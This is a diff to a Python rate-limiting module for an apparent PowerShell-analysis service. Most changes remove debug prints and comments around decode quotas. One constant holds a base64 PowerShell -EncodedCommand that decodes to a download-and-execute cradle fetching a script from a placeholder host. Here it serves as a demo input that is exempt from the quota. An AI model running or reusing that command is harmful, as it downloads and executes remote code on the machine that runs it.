@@ -5,7 +5,7 @@ from typing import Optional, Dict, Any
 from datetime import datetime, timedelta
 from services.session_manager import get_supabase_client
 
-# ✅ Example command that doesn't count towards quota
+
 EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'
 
 
@@ -44,7 +44,6 @@ async def check_session_rate_limit_from_db(
         result = query.execute()
         current_count = result.count or 0
         
-        print(f"[RATE LIMIT] Session: {session_id[:8] if session_id else 'NONE'}... | Count: {current_count}/{limit_per_minute}")
         
         within_limit = current_count < limit_per_minute
         
@@ -170,20 +169,9 @@ async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[
         Dictionary with decode permission and usage details
     """
     
-    # ✅ DEBUG: Log example command detection
-    print(f"\n[DECODE_CHECK] Checking if command is example...")
-    if command:
-        print(f"[DECODE_CHECK] Command received (first 100 chars): {command[:100]}...")
-        print(f"[DECODE_CHECK] Command length: {len(command)}")
-        print(f"[DECODE_CHECK] EXAMPLE_ENCODED_COMMAND length: {len(EXAMPLE_ENCODED_COMMAND)}")
-        print(f"[DECODE_CHECK] Command stripped: {command.strip()[:100]}...")
-        print(f"[DECODE_CHECK] Example stripped: {EXAMPLE_ENCODED_COMMAND.strip()[:100]}...")
-        print(f"[DECODE_CHECK] Are they equal? {command.strip() == EXAMPLE_ENCODED_COMMAND.strip()}")
-    else:
-        print(f"[DECODE_CHECK] No command provided")
+   
     
     if command and command.strip() == EXAMPLE_ENCODED_COMMAND.strip():
-        print(f"[DECODE_CHECK] ✅ EXAMPLE COMMAND DETECTED - Returning is_example=True")
         return {
             "can_decode": True,
             "current_usage": 0,
@@ -192,9 +180,6 @@ async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[
             "seconds_until_reset": None,
             "is_example": True
         }
-    else:
-        print(f"[DECODE_CHECK] ❌ NOT example command")
-    # For authenticated users, fetch their plan
     if user_id:
         plan_features = await get_user_plan_features(user_id)
         plan_name = plan_features.get("plan_name", "free")
@@ -207,16 +192,16 @@ async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[
         if guest_plan:
             can_decode_unlimited_flag = guest_plan.get("can_decode_commands", False)
             decode_limit = guest_plan.get("decode_limit_per_hour", 5)  # DB column still has old name
+            
         else:
             can_decode_unlimited_flag = False
             decode_limit = 5
+           
     
-    # If decode_limit is None, it means unlimited
+   
     is_unlimited = decode_limit is None
     
-    # Legacy check: if can_decode_commands is True AND decode_limit is None, it's unlimited.
-    # If can_decode_commands is True but decode_limit is set, we respect the limit.
-    # If plan is premium/enterprise, we force unlimited if DB config is missing (legacy fallback)
+   
     if is_unlimited or (plan_name in ["premium", "enterprise"] and decode_limit is None):
         return {
             "can_decode": True,
@@ -226,17 +211,18 @@ async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[
             "seconds_until_reset": None
         }
     
-    # Use the dynamic limit
+   
     limit = decode_limit if decode_limit is not None else 5
     
-    # Calculate current usage
+
+   
     from datetime import datetime, timedelta
-    
+
     window_start = datetime.utcnow() - timedelta(minutes=1)
+   
     supabase = get_supabase_client()
-    
-    # Query for analyses with decoded content (has_decoded_content = true)
-    # Count ALL decodes (including cache hits) to prevent infinite decode exploit
+
+   
     query = supabase.table('powershell_analyses')\
         .select('id, created_at, has_decoded_content, is_cache, session_id, user_id', count='exact')\
         .gte('created_at', window_start.isoformat())\
@@ -245,12 +231,14 @@ async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[
     if user_id:
         query = query.eq('user_id', user_id)
         target_id = f"user:{user_id}"
+        
     elif session_id:
         # For anonymous users, just match session_id (don't require user_id to be NULL)
         query = query.eq('session_id', session_id)
         target_id = f"session:{session_id}"
+       
     else:
-        print("[DECODE_CHECK] No user_id or session_id provided, blocking decode.")
+        
         return {
             "can_decode": False,
             "current_usage": 0,
@@ -263,14 +251,16 @@ async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[
     current_usage = result.count or 0
 
     # Debug: Log what we found
-    print(f"[DECODE_CHECK] Query result: found {current_usage} records in last minute")
     if result.data:
-        for r in result.data[:3]:  # Log first 3 records
-            print(f"  - id={r.get('id')}, has_decoded={r.get('has_decoded_content')}, is_cache={r.get('is_cache')}, session={r.get('session_id', 'N/A')[:8] if r.get('session_id') else 'N/A'}...")
-    
+       
+        for r in result.data[:5]:  # Log first 5 records
+            print(f"  - id={r.get('id')}, has_decoded={r.get('has_decoded_content')}, is_cache={r.get('is_cache')}, session={str(r.get('session_id', 'N/A'))[:8] if r.get('session_id') else 'N/A'}..., created={r.get('created_at')}")
+    else:
+        print(f"[DECODE_CHECK] No records found with has_decoded_content=True")
+
     can_decode = current_usage < limit
     
-    # ✅ FIX: Calculate seconds until reset using the oldest record's created_at
+   
     seconds_until_reset = None
     if not can_decode:
         # Query again to get the actual records with created_at
@@ -297,7 +287,6 @@ async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[
             # Fallback: If no records but limit reached (edge case)
             seconds_until_reset = 60
     
-    print(f"[DECODE_CHECK] {target_id} | Plan: {plan_name} | Can decode: {can_decode} | Used (DB): {current_usage}/{limit} | Reset in: {seconds_until_reset}s")
     
     return {
         "can_decode": can_decode,
